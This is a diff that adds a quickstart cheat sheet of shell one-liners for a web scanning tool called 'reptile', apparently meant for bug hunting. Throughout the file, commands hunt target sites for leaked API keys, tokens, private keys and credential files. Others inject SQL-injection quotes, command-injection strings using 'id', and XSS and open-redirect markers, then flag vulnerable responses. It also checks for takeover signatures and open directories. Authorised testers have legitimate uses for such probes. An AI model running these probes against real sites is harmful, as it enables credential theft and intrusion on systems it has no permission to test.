@@ -1,0 +1,100 @@
+========================
+  REPTILE QUICKSTART MENU
+========================
+
+# 🗃️  SUBS RECON #replace "some.com", if multiple,  -E "some1.com|some2.com"
+
+reptile reptileme "some.com" -B 500 --ua-chrome && reptile log | grep Context: | cut -d" " -f2- | tee reptilesubs
+
+
+# CVE HUNT
+
+reptile reptileme -E "php 5.|php 6.|php 4.|wordpress 4.|wordpress 5.|joomla 1.|joomla 2.|joomla 3.|drupal 6.|drupal 7.|drupal 8.|magento 1.|magento 1.|magento 1.|magento 2.|magento 2.|prestashop 1.6|prestashop 1.7|typo3 6.2|typo3 7.6|typo3 8.7|moodle 2.7|moodle 2.8|moodle 2.9|moodle 3.0|mediawiki 1.19|mediawiki 1.20|mediawiki 1.21|opencart 1.5|opencart 2.0|opencart 2.1|zend 1.0|zend 1.11|cakephp 2.0|cakephp 2.1|cakephp 2.2|symfony 2.0|symfony 2.1|symfony 2.2|typo3 4.5|typo3 4.6" --ua-chrome -A 500 -B 500 && reptile log
+
+
+# 📧 MAIL INJECTION+ARBITRARY FILE UPLOAD CHECKS  
+
+reptile reptileme -E "=\"email|='email|=\"file|='file" --ua-chrome -A 200 && reptile log
+
+#shortest possible substrs, scenarios considered: name= type= id= with email :D
+#unclosed quote since can be prefix e.g. name="emailAddress" or id="email-160" these cases I studied by observation
+
+# 📜 RXSS ULTIMATE OBSERVATION
+
+reptile reptileme -E "storage.|innerHTML|document.cookie|cookie|window.location|location.replace|URLSearchParams|params.get|html(|append(|prepend(|after(|before(|replaceWith(|wrap(|wrapAll(|wrapInner(|attr(|prop(|addEventListener(\"message|addEventListener('message" --ua-chrome -A 900 -B 900 &&  echo -e "==== HTML common XSS vectors ==== (including cookie/storage 2nd order XSS triggers)\n" && reptile log | grep -E "storage\.|innerHTML|document\.cookie|cookie\(|window\.location|location\.replace|URLSearchParams" && echo -e "==== JQuery XSS triger vectors ====\n" && reptile log | grep -E "params\.get|html\(|append\(|prepend\(|after\(|before\(|replaceWith\(|wrap\(|wrapAll\(|wrapInner\(|attr\(|prop\(" && echo -e "==== POSTMESSAGE vectors ====\n" && reptile log | grep -E "addEventListener\(\"message|addEventListener\('message"
+
+#JQuery included, getting params from url, set and get storage, and set/get cookie included
+
+# 📡 SOCIAL LINK JACKING CHECK #HITS alot! just after manual check
+
+reptile reptileme -E "//t.me|fb.com|facebook.com|instagram.com|//x.com|//vk.com|twitter.com|linkedin.com|youtube.com|github.com|medium.com|reddit.com|pinterest.com|tiktok.com" --ua-chrome -A 400 -B 400 \
+&& reptile log | grep -oE '(t\.me/[a-zA-Z0-9_-]+|vk\.com/[a-zA-Z0-9._-]+|facebook\.com/[a-zA-Z0-9._-]+|fb\.com/[a-zA-Z0-9._-]+|instagram\.com/[a-zA-Z0-9._-]+|//x\.com/[a-zA-Z0-9._-]+|twitter\.com/[a-zA-Z0-9._-]+|linkedin\.com/(in|company)/[a-zA-Z0-9._-]+|youtube\.com/(user|channel|@)[a-zA-Z0-9._-]+|github\.com/[a-zA-Z0-9._-]+|medium\.com/@[a-zA-Z0-9._-]+|reddit\.com/u/[a-zA-Z0-9._-]+|pinterest\.com/[a-zA-Z0-9._-]+|tiktok\.com/@[a-zA-Z0-9._-]+)' | sort -u | tee possible_claims.txt 
+
+# 📡 SOCIAL LINK JACKING CHECK after SHORTENED URLS
+
+reptile reptileme -E "//bit.ly/|//tinyurl.com/|//t.co/|//goo.gl/|//ow.ly/|//buff.ly/|//is.gd/|//rebrand.ly/" --ua-chrome -A 400 -B 400 && reptile log | grep Context: | links h | dj | grep -E "//bit\.ly/|//tinyurl\.com/|//t\.co/|//goo\.gl/|//ow\.ly/|//buff\.ly/|//is\.gd/|//rebrand\.ly/"> shortened_urls && gr shortened_urls && grep -Eo '(//t\.me/[a-zA-Z0-9_-]+|facebook\.com/[a-zA-Z0-9._-]+|fb\.com/[a-zA-Z0-9._-]+|instagram\.com/[a-zA-Z0-9._-]+|//x\.com/[a-zA-Z0-9._-]+|twitter\.com/[a-zA-Z0-9._-]+|linkedin\.com/(in|company)/[a-zA-Z0-9._-]+|youtube\.com/(user|channel|@)[a-zA-Z0-9._-]+|github\.com/[a-zA-Z0-9._-]+|medium\.com/@[a-zA-Z0-9._-]+|reddit\.com/u/[a-zA-Z0-9._-]+|pinterest\.com/[a-zA-Z0-9._-]+|tiktok\.com/@[a-zA-Z0-9._-]+)' redirects.txt | sort -u | tee possible_claims_shortened_urls.txt
+
+# 🔐 API KEY / SECRET LEAKS  
+
+reptile reptileme -E "api_key =|api-key =|apikey =|apikey:|apikey':|apikey\":|api-key:|api-key':|api-key\":|api_key:|api_key':|api_key\":|auth_token:|auth_token':|auth_token\":|access_token:|access_token':|access_token\":|authToken:|'authToken':|\"authToken\":|x-api-key':|x-api-key\":|x_auth_token':|x_auth_token\":|client_secret:|client_secret':|client_secret\":|clientSecret:|clientSecret':|clientSecret\":|_key:|_key':|_key\":|secretKey:|secretKey':|secretKey\":|session_token:|session_token':|session_token\":|privateKey:|privateKey':|privateKey\":|'Authorization':|\"Authorization\":|Bearer:|'Bearer':|\"Bearer\":|authKey':|authKey\":|consumer_secret:|consumer_secret':|consumer_secret\":|app_secret:|app_secret':|app_secret\":|'firebase':|\"firebase\":|'sentry_dsn':|\"sentry_dsn\":|'dsn':|\"dsn\":|'stripe':|\"stripe\":|'paypal':|\"paypal\":|'jwt':|\"jwt\":" --ua-chrome -A 500 -B 50 && reptile log
+
+# 🕵 ️‍ Finds Sensitive Files/Dirs #NEW!
+
+reptile reptileme -E ".env|.env.|config.js|credentials.json|secrets.json|secrets.yml|tokens.json|google_api_key.txt|firebase-service-account.json|gcloud-api-key.json|aws-credentials.csv|apikey.txt|token.txt|id_rsa|id_rsa.pub|.pem|.key|.crt|private.key|server.key|server.crt|key.pem|cert.pem|config.php|config.json|database.php|database.yml|db.php|settings.py|settings_local.py|config_local.py|appsettings.json|appsettings.Development.json|appsettings.Production.json|machine.config|web.config|web.config.bak|Web.Debug.config|Web.Release.config|global.asax|wp-config.php|artisan|routes/web.php|routes/api.php|bootstrap/cache/|storage/logs/|storage/app/public/|vendor/|composer.json|composer.lock|manage.py|Pipfile|Pipfile.lock|__pycache__/|.pyc|.pyo|instance/config.py|migrations/|package.json|package-lock.json|yarn.lock|pnpm-lock.yaml|next.config.js|nuxt.config.js|angular.json|vue.config.js|tsconfig.json|webpack.config.js|vite.config.js|node_modules/|public/|static/|Dockerfile|docker-compose.yml|docker-compose.override.yml|.dockerignore|.gitlab-ci.yml|.circleci/config.yml|.git|.bzr/|.hg/|.svn/|CVS/|.vscode/|.idea/|.code-workspace|.project|.settings/|.classpath|.metadata/|Thumbs.db|.DS_Store|desktop.ini|.htaccess|.htpasswd|.ssh|.sql|.bak|.backup|.old|.save|.swp|.orig|.inc|.tmp|.log|.test|.disabled|.txt|backup.zip|archive.zip|backup.tar.gz|log.txt|error.log|laravel.log|debug.log|phpinfo.php|trace.axd|elmah.axd|services.asmx|service.svc|aspnet_client|App_Data|App_Code|App_GlobalResources|App_LocalResources|App_Themes|App_WebReferences|bin/|default.aspx|index.aspx|default.htm|index.htm|/admin/|/admin_old/|/administrator/|/panel/|/hidden/|/secure/|/private/|/secrets/|/data/|/config/|/app/|/uploads/|/scripts/|/console/|/shell/|/cmd/|/cgi-bin/|/old/|/backup/|/db/|/sql/|/logs/|/tmp/|/var/|/env/|/dev/|/debug/|/core/|/source/|/sandbox/|/staging/|/test/" --ua-chrome -B 900 -A 200 && reptile finds
+
+# 🛑 ERROR DISCLOSURES / DEBUG OUTPUT  
+
+reptile reptileme -E "Warning:|Notice:|Fatal error:|Traceback|Stack trace|ORA-00933|Microsoft OLE DB Provider|error on line:" --ua-chrome && reptile log
+
+#🏚️  SUBDOMAIN TAKEOVER DETECT  
+
+reptile reptileme -E "404 Blog is not found|404 error unknown site\!|404: This page could not be found.|Account not found.|DEPLOYMENT_NOT_FOUND.|Do you want to register .*.wordpress.com?|Hello\! Sorry, but the website you\&rsquo;re looking for doesn\&rsquo;t exist.|HTTP_STATUS=301|No settings were found for this company:|NXDOMAIN|PAGE NOT FOUND.|Repository not found|Sorry, this page is no longer available.|Sorry, this shop is currently unavailable.|The page you were looking for does not exist.|The specified bucket does not exist|The URL you've accessed does not provide a hub.|ViewerCertificateException|We could not find what you're looking for.|There isn't a GitHub Pages" --ua-chrome && reptile log
+
+# 📂 OPEN DIRECTORIES  
+
+cat reptileme | paths 1 | grep -vE //$ >pall
+cat reptileme | paths 2 | grep -vE //$ >>pall
+cat reptileme | paths 3 | grep -vE //$ >>pall
+cat reptileme | paths 4 | grep -vE //$ >>pall
+reptile pall -E "Index of /|Parent Directory|Directory Listing For|Welcome to nginx" --ua-chrome && reptile log
+
+# 🕳 ️ JWT LEAK CHECK (base64 m64)  
+
+reptile reptileme -E "IkpXVC|JKV1Q|iSldUI" --ua-chrome && reptile log
+
+# 🧪 INJECT → DETECT SQLi (COMBO MODE)  
+
+cat reptileme | qsreplace -a "'\"" >injected.txt  
+reptile injected.txt -E "SQL | SQL|mysql_fetch|SQLSTATE|ORA-" --ua-chrome && reptile log
+
+# 💀️💀️💀️ LOOK FOR RCE
+
+cat reptileme | qsreplace -a " & id & " > rce.txt
+cat reptileme | qsreplace -a "' & id; " >> rce.txt
+cat reptileme | qsreplace -a '" & id; ' >> rce.txt
+reptile rce.txt ") groups=" --ua-chrome -A 200 -B 200 && reptile log
+
+# 😎 INJECT COOKIE+REFERER → DETECT XSS  
+
+reptile reptileme "cookieORrefererReflection" -H "Cookie: cookie=cookieORrefererReflection" -H "Referer: cookieORrefererReflection" --ua-chrome -A 500 -B 500 && reptile log
+
+#note if gbr dc has logs, use these cookies, chances_of_cookie_reflection++
+
+# 🦠 INJECT single quote PAYLOAD + DETECT UNCOMMON COMMON XSS
+
+cat reptileme | qsreplace "NoWayThisCouldBeInHTML'" > injected.txt  
+reptile injected.txt "NoWayThisCouldBeInHTML'" --ua-chrome -A 200 -B 200 && reptile log
+
+# ✨ XSS in href/form action=   or  Deceptive open redirect
+
+cat reptileme | qsreplace findm3 >4reptile_action_href_XSS
+reptile 4reptile_action_href_XSS -E "findm3" --ua-chrome  -A 300 -B 300 && reptile log | grep -E "href=\"findm3|action=\"findm3|href='findm3|action='findm3|/findm3"
+
+# POSSIBLE XSSI + JS file recon
+reptile reptileme -E ".js\"|.js'" --ua-chrome -B 900 -A 100 && reptile finds
+
+
+# 🧠 For more custom payload combos, check out:  
+# - qsreplace  
+# - ffuf + reptile  
+# - m64 + reptile
